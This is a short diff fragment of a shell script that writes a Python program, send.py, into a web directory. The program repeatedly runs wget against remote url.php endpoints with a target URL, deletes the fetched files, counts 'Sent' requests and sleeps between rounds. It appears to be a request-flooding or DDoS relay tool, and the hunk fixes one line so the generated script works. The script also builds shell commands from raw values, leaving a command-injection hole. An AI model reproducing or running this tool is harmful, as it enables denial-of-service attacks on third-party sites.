@@ -71,6 +71,6 @@ echo "    count += 1" >> /var/www/html/send.py
 echo "    os.system(\"wget http://%s/url.php?url=%s >/dev/null 2>&1\" % (ip, url))" >> /var/www/html/send.py
 echo "    os.system(\"rm -rf url.php?*\")" >> /var/www/html/send.py
 echo "    sys.stdout.write(\"Sent: {} Requests\n\".format(count))" >> /var/www/html/send.py
-echo "    time.sleep(int(wait_time))"
+echo "    time.sleep(int(wait_time))" >> /var/www/html/send.py
 echo "    if (count == reqs):" >> /var/www/html/send.py
 echo "        break" >> /var/www/html/send.py
